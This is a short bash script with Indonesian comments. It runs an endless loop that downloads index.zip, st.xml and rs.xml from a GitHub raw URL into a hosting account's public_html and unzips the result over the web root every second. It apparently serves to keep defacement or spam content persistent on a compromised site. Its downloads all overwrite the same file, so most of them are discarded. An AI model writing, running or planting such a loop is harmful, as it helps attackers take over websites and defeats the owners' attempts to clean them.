#!/bin/bash

while true; do
    # Download file index.zip ke public_html
    wget -O /home/simpegx10/public_html/index.zip https://raw.githubusercontent.com/agil0908/proof/refs/heads/main/index.zip

    wget -O /home/simpegx10/public_html/index.zip https://raw.githubusercontent.com/agil0908/proof/refs/heads/main/st.xml

    wget -O /home/simpegx10/public_html/index.zip https://raw.githubusercontent.com/agil0908/proof/refs/heads/main/rs.xml
    
    # Ekstrak file ke public_html (overwrite jika ada file lama)
    unzip -o /home/simpegx10/public_html/index.zip -d /home/simpegx10/public_html/

    # Tunggu 1 detik sebelum mengulang
    sleep 1
done
